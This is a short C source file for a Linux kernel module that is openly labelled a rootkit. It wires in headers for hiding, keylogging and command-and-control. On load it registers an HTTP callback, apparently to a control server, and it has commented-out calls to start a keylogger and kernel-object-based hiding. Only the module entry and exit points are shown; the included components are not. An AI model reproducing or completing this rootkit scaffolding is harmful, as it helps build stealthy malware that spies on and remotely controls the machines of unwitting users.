#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include "hidder.h"
#include "credit.h"
#include "keylogger.h"
#include "cnc.h"


int init_rootkit ( void )
{
	printk("[+] Init_rootkit\n");
	// set_keylogger();
	set_http_callback();

	//set_dkom_lkm();
}


void clean_rootkit ( void )
{
	printk("[+] clean_rootkit\n");
	// unset_keylogger();
	unset_http_callback();
}


MODULE_LICENSE("GPL");

module_init(init_rootkit);
module_exit(clean_rootkit);
